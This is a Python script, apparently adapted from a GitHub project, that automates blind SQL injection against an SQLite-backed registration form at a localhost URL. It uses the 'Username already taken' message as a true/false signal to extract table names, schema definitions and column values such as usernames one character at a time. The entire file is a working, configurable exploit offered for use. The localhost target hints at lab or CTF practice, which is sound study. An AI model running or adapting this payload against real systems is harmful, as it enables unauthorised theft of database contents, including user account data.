#taken from https://github.com/aykutcanustun/SQLiteBLINDInjection
# (but heavilly edited)
import requests
import uuid

s = requests.Session()
# QUERY EXAMPLES, UNCOMMENT BLOCK TO USE

# Retrieve table names:
#query = "{}\" or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {}),{},1)){} {} -- "

# Retrive creation command:
#table_name = "users"
#query = "{}\" or UNICODE(SUBSTR((SELECT sql FROM sqlite_master WHERE tbl_name='" + table_name + "' LIMIT 1 OFFSET {}),{},1)){} {} -- "

# Retrive values in columns:
table_name = "users"
column_name = "username"
order_column = "id"
query = "{}\" or UNICODE(SUBSTR((SELECT " + column_name + " FROM " + table_name + " ORDER BY " + order_column + " ASC LIMIT 1 OFFSET {}),{},1)){} {}  -- "

#website specific settings
url = "http://localhost:8080/register"
field = "username"
true_message = "Username already taken"

searchRange = 4 #searches this many rows of data

#dont edit these variables
charSeaching = 1
interval = 0
print("Injection started...")
for j in range(0,searchRange):
    print("\n" + str(j+1) + ". ", end="")
    finished = False
    charSeaching = 1
    while not finished:
        for i in 44, 56, 68, 80, 92, 104, 116, 128:
            req = s.post(
                url, json={field: query.format(str(uuid.uuid4().int), str(j), charSeaching, "<", str(i)), "email": "test@test.com", "password": "test12345"})
            if true_message in str(req.text):
                interval = i
                break

        for i in range(interval-12, interval):
            req = s.post(
                url, json={field: query.format(str(uuid.uuid4().int), str(j), charSeaching, "=", str(i)), "email": "test@test.com", "password": "test12345"})
            if true_message in str(req.text):
                charSeaching += 1
                finished = False
                print(chr(i), end="")
                break
            else:
                finished = True
